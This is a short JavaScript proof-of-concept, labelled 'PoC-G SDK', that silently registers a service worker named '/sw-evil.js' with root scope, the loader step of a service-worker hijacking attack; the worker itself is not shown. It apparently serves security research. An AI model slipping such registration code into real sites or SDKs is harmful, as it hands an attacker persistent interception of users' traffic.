(function () {
  try {
    if (!("serviceWorker" in navigator)) {
      console.log("[PoC-G SDK] serviceWorker not supported");
      return;
    }

    const scriptUrl = "/sw-evil.js";
    const opts = { scope: "/" };

    console.log("[PoC-G SDK] registering SW:", scriptUrl, opts);

    navigator.serviceWorker.register(scriptUrl, opts)
      .then((reg) => {
        console.log("[PoC-G SDK] register OK", reg);
      })
      .catch((e) => {
        console.log("[PoC-G SDK] register FAIL", String(e?.message || e));
      });
  } catch (e) {
    console.log("[PoC-G SDK] error", String(e?.message || e));
  }
})();

